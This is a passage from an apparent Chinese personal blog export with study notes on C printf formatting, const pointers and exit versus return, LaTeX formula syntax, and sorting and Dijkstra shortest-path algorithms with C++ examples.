class="comment">//按size大小输出到字符串str中</span></span><br></pre></td></tr></table></figure><p>以下函数功能与上面的一一对应相同，只是在函数调用时，把上面的…对应的一个个变量用va_list调用所替代。在函数调用前ap要通过va_start()宏来动态获取。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfprintf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsnprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="format格式说明"><a href="#format格式说明" class="headerlink" title="format格式说明"></a>format格式说明</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//%s</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> str = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> str5 = <span class="string">"abcde"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.5s\r\n"</span>, str);        <span class="comment">//'abcde' 只显示前五个字符</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.10s\r\n"</span>, str5);      <span class="comment">//'abcde' 不足10个只打印5个</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%5.3s\r\n"</span>, str);       <span class="comment">//'  abc' 最少占用5个字符宽度，只打印3个，右对齐</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%-5.3s\r\n"</span>, str);      <span class="comment">//'abc  ' 最少占用5个字符宽度，只打印3个，左对齐</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3.5s\r\n"</span>, str);       <span class="comment">//'abcde' 最少占用3个字符宽度，打印5个，3的限制失效</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%10s\r\n"</span>, str);        <span class="comment">//'abcdefghijklmnopqrstuvwxyz' 最少占用10个字符宽度，打印26个，10的限制失效</span></span><br></pre></td></tr></table></figure><h1 id="const的使用"><a href="#const的使用" class="headerlink" title="const的使用"></a>const的使用</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *p;          <span class="comment">//*p是const,p可变：const 后面紧跟的是char，所以*p是一个char字符，不可变</span></span><br><span class="line"><span class="keyword">const</span> (<span class="keyword">char</span> *) p;       <span class="comment">// p是const, *p可变：const 后面紧跟的是（char *）这个整体，所以p是char*类型，不可变。</span></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> p;          <span class="comment">// p是const, *p可变:const 后面紧跟的是p,所以p不可变</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> p;    <span class="comment">// p和*p都是const：第一个const后面紧跟的是char,所以char类型的字符*p不可变；第二个const后面紧跟的是p,所以p不可变。</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">const</span> *p;          <span class="comment">// *p是const, p可变：const后面紧跟的是*, 但是单独的*不能表明修饰的内容，所以将*p看成一个整体，所以const修饰的是*p,*p不可变。</span></span><br><span class="line">(<span class="keyword">char</span>*) <span class="keyword">const</span> p;        <span class="comment">// p是const, *p可变：const紧跟的是p,所以p不可变。</span></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> p;          <span class="comment">// p是const, *p可变：const紧跟的是p,所以p不可变。</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">const</span> *<span class="keyword">const</span> p;    <span class="comment">// p和*p都是const：第一个const紧跟的是*,不能表明修饰的内容，将后面整体的（* const p）看成一个整体，那就说明*p不可变，第二个const后面紧跟的是p,所以p不可变。</span></span><br></pre></td></tr></table></figure><h1 id="exit和return"><a href="#exit和return" class="headerlink" title="exit和return"></a>exit和return</h1><ul><li>exit用于在程序运行的过程中随时结束程序，exit的参数是返回给OS的。main函数结束时也会隐式地调用exit函数。exit函数运行时首先会执行由atexit()函数登记的函数，然后会做一些自身的清理工作，同时刷新所有输出流、关闭所有打开的流并且关闭通过标准I/O函数tmpfile()创建的临时文件。exit是结束一个进程，它将删除进程使用的内存空间，同时把错误信息返回父进程；而return是返回函数值并退出函数。通常情况：exit(0)表示程序正常, exit(1)和exit(-1)表示程序异常退出，exit(2)表示表示系统找不到指定的文件。在整个程序中，只要调用exit就结束（当前进程或者在main时候为整个程序）。</li><li>return是语言级别的，它表示了调用堆栈的返回；return( )是当前函数返回，当然如果是在主函数main, 自然也就结束当前了，如果不是，那就是退回上一层调用。在多个进程时。如果有时要检测上个进程是否正常退出。就要用到上个进程的返回值，依次类推。而exit是系统调用级别的，它表示了一个<strong>进程</strong>的结束。</li><li>exit函数是退出应用程序，并将应用程序的一个状态返回给OS，这个状态标识了应用程序的一些运行信息。</li><li>和机器和操作系统有关的一般是： 0为正常退出，非0为非正常退出；</li><li>exit()头文件为<code>#include &lt;stdlib.h&gt;</code></li></ul><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="redefine错误"><a href="#redefine错误" class="headerlink" title="redefine错误"></a>redefine错误</h2><ul><li>全局变量在定义必须在c和cpp中，可以在公用头文件以extern声明，不然会被两个同时包含头文件的源文件编译时报重复定义的错误</li><li>宏定义在头文件中定义被两个源文件编译不会报重复定义的错误</li><li>宏定义同一个名字在两个头文件定义，内容定义相同不报错，不同则报warning，最新的会覆盖掉老的定义</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>latex笔记</title>
    <url>/2018/09/18/2018-09-18-latexStudy/</url>
    <content><![CDATA[<h1 id="markdown中的latex"><a href="#markdown中的latex" class="headerlink" title="markdown中的latex"></a>markdown中的latex</h1><ul><li>行内公式 <code>$\{[z-(1+\frac23x)y]\div 4\}$</code>: ${[z-(1+\frac23x)y]\div4}$</li><li>块级公式 <code>$$\sum_{i = 1}^n a_i=0$$</code>: $$\sum_{i = 1}^n a_i=0$$</li></ul><h1 id="公式格式记录"><a href="#公式格式记录" class="headerlink" title="公式格式记录"></a>公式格式记录</h1><h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><p>参考文档: <a href="http://www.mohu.org/info/symbols/symbols.htm" target="_blank" rel="noopener">常用数学符号的 LaTeX 表示方法</a></p><h3 id="常用数学符号"><a href="#常用数学符号" class="headerlink" title="常用数学符号"></a>常用数学符号</h3><ul><li><code>$\sigma$</code>: $\sigma$</li><li>累加算子<code>$\Sigma$</code>: $\Sigma$</li><li>梯度算子<code>$\nabla$</code>: $\nabla$</li><li>偏导算子<code>$\partial$</code>: $\partial$</li><li>属于<code>$\in$</code>: $\in$</li><li>无穷<code>$\infty$</code>: $\infty$</li><li>任意<code>$\forall$</code>: $\forall$</li><li>约等于<code>$\approx$</code>: $\approx$</li><li>因为<code>$\because$</code>: $\because$</li><li>所以<code>$\therefore$</code>: $\therefore$</li><li>字母右上角一撇<code>$a^{\prime}$</code>: $a^{\prime}$</li></ul><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><table><thead><tr><th>描述</th><th>代码</th><th>效果</th><th>宽度</th></tr></thead><tbody><tr><td>两个quad空格</td><td>a \qquad b</td><td>$a \qquad b$</td><td>两个m的宽度</td></tr><tr><td>quad空格</td><td>a \quad b</td><td>$a \quad b$</td><td>一个m的宽度</td></tr><tr><td>大空格</td><td>a\ b</td><td>$a\ b$</td><td>1/3m宽度</td></tr><tr><td>中等空格</td><td>a\;b</td><td>$a\;b$</td><td>2/7m宽度</td></tr><tr><td>小空格</td><td>a\,b</td><td>$a\,b$</td><td>1/6m宽度</td></tr><tr><td>没有空格</td><td>ab</td><td>$ab$</td><td></td></tr><tr><td>紧贴</td><td>a\!b</td><td>$a\!b$</td><td>缩进1/6m宽度</td></tr></tbody></table><h2 id="乘方"><a href="#乘方" class="headerlink" title="乘方"></a>乘方</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ a^b $$</span><br><span class="line">$$ a^bc $$</span><br><span class="line">$$ a^&#123;bc&#125; $$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$ a^b $$<br>$$ a^bc $$<br>$$ a^{bc} $$</p><h2 id="分数"><a href="#分数" class="headerlink" title="分数"></a>分数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ \frac&#123;A&#125;&#123;B&#125; $$</span><br><span class="line">$$ \frac abc $$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$ \frac{A}{B} $$<br>$$ \frac abc $$</p><h2 id="阶段函数表示"><a href="#阶段函数表示" class="headerlink" title="阶段函数表示"></a>阶段函数表示</h2><p>array后面的<code>ll</code>表示每一列的对齐方式，l：左对齐，c：居中，r：右对齐</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ f(z) &#x3D; \left\&#123;\begin&#123;array&#125;&#123;ll&#125;</span><br><span class="line">    1 &amp; &#123;z &gt; 0&#125; \\</span><br><span class="line">    0 &amp; otherwise</span><br><span class="line">\end&#123;array&#125;\right. $$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$ f(z) = \left\{\begin{array}{ll}<br>1 &amp; {z &gt; 0} \\<br>0 &amp; otherwise<br>\end{array}\right. $$</p><h2 id="公式推导换行等号对齐"><a href="#公式推导换行等号对齐" class="headerlink" title="公式推导换行等号对齐"></a>公式推导换行等号对齐</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ \begin&#123;aligned&#125;</span><br><span class="line">    f(x) &amp; &#x3D; (x + 1)^2 \\</span><br><span class="line">    &amp; &#x3D; x^2 + 2x + 1</span><br><span class="line">\end&#123;aligned&#125; $$</span><br></pre></td></tr></table></figure><p>$$ \begin{aligned}<br>f(x) &amp; = (x + 1)^2 \\<br>&amp; = x^2 + 2x + 1<br>\end{aligned} $$</p><h2 id="公式编号"><a href="#公式编号" class="headerlink" title="公式编号"></a>公式编号</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% 手动编号，一个块级公式只能用一个tag</span><br><span class="line">$$ x &#x3D; (tp_1, tp_2, ..., tp_&#123;N - 1&#125;, tp_N), \tag&#123;1&#125;$$</span><br><span class="line">$$ y &#x3D; (0, 1, ..., 0, 0), \tag&#123;2&#125;$$</span><br><span class="line"></span><br><span class="line">% 自动编号</span><br><span class="line">$$\begin&#123;equation&#125;</span><br><span class="line">x^n+y^n&#x3D;z^n</span><br><span class="line">\end&#123;equation&#125;$$</span><br></pre></td></tr></table></figure><p>$$ x = (tp_1, tp_2, …, tp_{N - 1}, tp_N), \tag{1}$$<br>$$ y = (0, 1, …, 0, 0), \tag{2}$$</p><p>$$\begin{equation}<br>x^n+y^n=z^n<br>\end{equation}$$</p><h2 id="log函数"><a href="#log函数" class="headerlink" title="log函数"></a>log函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ log_A&#123;B&#125; $$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$ log_A{B} $$</p><h2 id="累加符号"><a href="#累加符号" class="headerlink" title="累加符号"></a>累加符号</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 行间公式 $ \sum_&#123;N&#125;^&#123;n&#125;a $</span><br><span class="line">- 独立公式 $$ \sum_&#123;N&#125;^&#123;n&#125;a $$</span><br><span class="line">- 行间公式使用上下形式 $ \sum\limits_&#123;N&#125;^&#123;n&#125;a $</span><br><span class="line">- 独立公式使用左右形式 $$ \sum\nolimits_&#123;N&#125;^&#123;n&#125;a $$</span><br><span class="line">- 不加大括号 $ \sum\limits_N^na $</span><br><span class="line">- 不加大括号 $ \sum\limits_Nb^na $</span><br><span class="line">- 加大括号 $ \sum\limits_&#123;Nb&#125;^&#123;na&#125; $</span><br></pre></td></tr></table></figure><p>效果</p><ul><li>行间公式 $ \sum_{N}^{n}a $</li><li>独立公式 $$ \sum_{N}^{n}a $$</li><li>行间公式使用上下形式 $ \sum\limits_{N}^{n}a $</li><li>独立公式使用左右形式 $$ \sum\nolimits_{N}^{n}a $$</li><li>不加大括号 $ \sum\limits_N^na $</li><li>不加大括号 $ \sum\limits_Nb^na $</li><li>加大括号 $ \sum\limits_{Nb}^{na} $</li></ul><h2 id="最小值下方加参数"><a href="#最小值下方加参数" class="headerlink" title="最小值下方加参数"></a>最小值下方加参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ \min\limits_&#123;w \in W&#125; $$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$ \min\limits_{w \in W} $$</p><h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><h3 id="直接使用矩阵符号"><a href="#直接使用矩阵符号" class="headerlink" title="直接使用矩阵符号"></a>直接使用矩阵符号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;matrix&#125; 0 &amp; 1 \\ 1 &amp; 0 \end&#123;matrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;pmatrix&#125; 0 &amp; -i \\ i &amp; 0 \end&#123;pmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;bmatrix&#125; 0 &amp; -1 \\ 1 &amp; 0 \end&#123;bmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;Bmatrix&#125; 1 &amp; 0 \\ 0 &amp; -1 \end&#123;Bmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;vmatrix&#125; a &amp; b \\ c &amp; d \end&#123;vmatrix&#125;</span><br><span class="line">\quad</span><br><span class="line">\begin&#123;Vmatrix&#125; i &amp; 0 \\ 0 &amp; -i \end&#123;Vmatrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$<br>\begin{matrix} 0 &amp; 1 \\ 1 &amp; 0 \end{matrix}<br>\quad<br>\begin{pmatrix} 0 &amp; -i \\ i &amp; 0 \end{pmatrix}<br>\quad<br>\begin{bmatrix} 0 &amp; -1 \\ 1 &amp; 0 \end{bmatrix}<br>\quad<br>\begin{Bmatrix} 1 &amp; 0 \\ 0 &amp; -1 \end{Bmatrix}<br>\quad<br>\begin{vmatrix} a &amp; b \\ c &amp; d \end{vmatrix}<br>\quad<br>\begin{Vmatrix} i &amp; 0 \\ 0 &amp; -i \end{Vmatrix}<br>$$</p><h3 id="使用array构建矩阵"><a href="#使用array构建矩阵" class="headerlink" title="使用array构建矩阵"></a>使用<code>array</code>构建矩阵</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\left(                  %左括号</span><br><span class="line">\begin&#123;array&#125;&#123;ccc&#125;      %该矩阵一共3列，每一列都居中放置</span><br><span class="line">    a11 &amp; a12 &amp; a13\\   %第一行元素</span><br><span class="line">    a21 &amp; a22 &amp; a23\\   %第二行元素</span><br><span class="line">\end&#123;array&#125;</span><br><span class="line">\right)                 %右括号</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>效果</p><p>$$ \left(\begin{array}{ccc}<br>a11 &amp; a12 &amp; a13 \\<br>a21 &amp; a22 &amp; a23<br>\end{array}\right) $$</p>]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>算法与数据结构学习</title>
    <url>/2018/09/18/2018-09-18-algorithmStudy/</url>
    <content><![CDATA[<h1 id="数学知识复习"><a href="#数学知识复习" class="headerlink" title="数学知识复习"></a>数学知识复习</h1><h2 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h2><h3 id="定理-1-1"><a href="#定理-1-1" class="headerlink" title="定理 1.1"></a>定理 1.1</h3><p>$$ log_A{B} = \frac{log_C{B}}{log_C{A}} ; C &gt; 0 $$</p><h2 id="级数"><a href="#级数" class="headerlink" title="级数"></a>级数</h2><h3 id="几何级数公式"><a href="#几何级数公式" class="headerlink" title="几何级数公式"></a>几何级数公式</h3><p>$$ \sum_{i = 0}^{N}2^i = 2^{N+1} - 1 $$</p><p>$$ \sum_{i = 0}^{N}A^i = \frac{A^{N+1} - 1}{A - 1} $$</p><p>当N趋于$\infty$时，该和趋于$\frac{1}{1-A}$。</p><h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><h3 id="四个定义"><a href="#四个定义" class="headerlink" title="四个定义"></a>四个定义</h3><ul><li>如果存在正常数 $c$ 和 $n_0$ 使得当 $N \geq n_0$ 时 $T(N) \leq cf(N)$ ，则即为 $T(N) = O(f(N))$ 。</li><li>如果存在正常数 $c$ 和 $n_0$ 使得当 $N \geq n_0$ 时 $T(N) \geq cg(N)$ ，则即为 $T(N) = \Omega(f(N))$ 。</li><li>$T(N) = \Theta (h(N))$ 当且仅当 $T(N) = O(h(N))$ 且 $T(N) = \Omega(h(N))$ 。</li><li>如果 $T(N) = O(p(N))$ 且 $T(N) \neq \Theta(p(N))$ ，则 $T(N) = o(p(N))$</li></ul><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><h3 id="时间复杂度总结"><a href="#时间复杂度总结" class="headerlink" title="时间复杂度总结"></a>时间复杂度总结</h3><img src="/2018/09/18/2018-09-18-algorithmStudy/2018_09_26_01.jpg" width="80%"><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul><li>自我理解像扑克牌起牌一样，一张一张插入到已有的序列中</li></ul><img src="/2018/09/18/2018-09-18-algorithmStudy/2018_09_26_02.gif" width="80%"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @function 用插入排序数组</span></span><br><span class="line"><span class="comment"> * @param data 数组首地址</span></span><br><span class="line"><span class="comment"> * @param length 数组长度</span></span><br><span class="line"><span class="comment"> * @param order 排列顺序：顺序，true；倒序，false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(T *data, <span class="keyword">int</span> length, <span class="keyword">bool</span> order = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    T tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        tmp = data[i];</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span> &amp;&amp; ((data[j - <span class="number">1</span>] &gt; tmp) ^ !order); --j) &#123;</span><br><span class="line">            data[j] = data[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        data[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><ul><li>$N$个互异数的数组的平均逆序数是$N(N-1)/4$。</li><li>通过交换相邻元素进行排序的任何算法平均需要$\Omega(N^2)$时间。</li></ul><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><ul><li>带间隔的插入排序</li></ul><img src="/2018/09/18/2018-09-18-algorithmStudy/2018_09_26_03.gif" width="80%"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @function 用希尔增量的希尔排序数组</span></span><br><span class="line"><span class="comment"> * @param data 数组首地址</span></span><br><span class="line"><span class="comment"> * @param length 数组长度</span></span><br><span class="line"><span class="comment"> * @param order 排列顺序：顺序，true；倒序，false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(T *data, <span class="keyword">int</span> length, <span class="keyword">bool</span> order = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    T tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> increment = length / <span class="number">2</span>; increment &gt; <span class="number">0</span>; increment /= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = increment; i &lt; length; ++i) &#123;</span><br><span class="line">            tmp = data[i];</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = i; j &gt;= increment &amp;&amp; ((data[j - increment] &gt; tmp) ^ !order); j -= increment) &#123;</span><br><span class="line">                data[j] = data[j - increment];</span><br><span class="line">            &#125;</span><br><span class="line">            data[j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h4><ul><li>使用希尔增量时希尔排序的最坏情形的运行时间为$\Theta(N^2)$。</li><li>使用Hibbard增量的希尔排序的最坏情形运行时间为$\Theta(N^{\frac{3}{2}})$</li></ul><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>-</p><img src="/2018/09/18/2018-09-18-algorithmStudy/2018_09_26_04.gif" width="80%"><h2 id="最短路径算法"><a href="#最短路径算法" class="headerlink" title="最短路径算法"></a>最短路径算法</h2><h3 id="Dijkstra-迪杰斯特拉-算法"><a href="#Dijkstra-迪杰斯特拉-算法" class="headerlink" title="Dijkstra(迪杰斯特拉)算法"></a>Dijkstra(迪杰斯特拉)算法</h3><p>Dijkstra(迪杰斯特拉)算法是典型的单源最短路径算法，用于计算一个节点到其他所有节点的最短路径。主要特点是以起始点为中心向外层层扩展，直到扩展到终点为止。</p><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><img src="/2018/09/18/2018-09-18-algorithmStudy/2019_02_23_08.png" width="40%"> <img src="/2018/09/18/2018-09-18-algorithmStudy/2019_02_23_09.png" width="80%"><p>示例，自己写的，没有考虑内存和时间，改了一下，变成有向路径算法。无向路径可以使用上述U集作为while判断，减少循环次数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"log.hpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> InputFileName <span class="meta-string">"../input.txt"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按行返回数据</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readFile</span><span class="params">(<span class="built_in">string</span> &amp;input)</span> </span>&#123;</span><br><span class="line">    input = <span class="string">""</span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> ifstream <span class="title">inFile</span><span class="params">(InputFileName)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inFile) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"Failed to open file %s"</span>, InputFileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!inFile.eof()) &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        inFile.getline(buf, <span class="number">128</span>);</span><br><span class="line">        input = <span class="built_in">string</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将字母转成数字</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">char</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将数字转成字母</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getChar</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'A'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'B'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'C'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'D'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'E'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'F'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//由于已知点数量，第一行废掉</span></span><br><span class="line">    <span class="built_in">string</span> inputStr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (readFile(inputStr) != <span class="number">0</span>) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"Read file error"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义距离矩阵</span></span><br><span class="line">    <span class="keyword">int</span> distance[<span class="number">6</span>][<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">//初始化所有距离为-1</span></span><br><span class="line">            distance[i][j] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//自己到自己为0</span></span><br><span class="line">        distance[i][i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">char</span>, <span class="built_in">string</span>&gt; road;</span><br><span class="line">    <span class="keyword">while</span> (readFile(inputStr) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> a = getIndex(inputStr[<span class="number">0</span>]);      <span 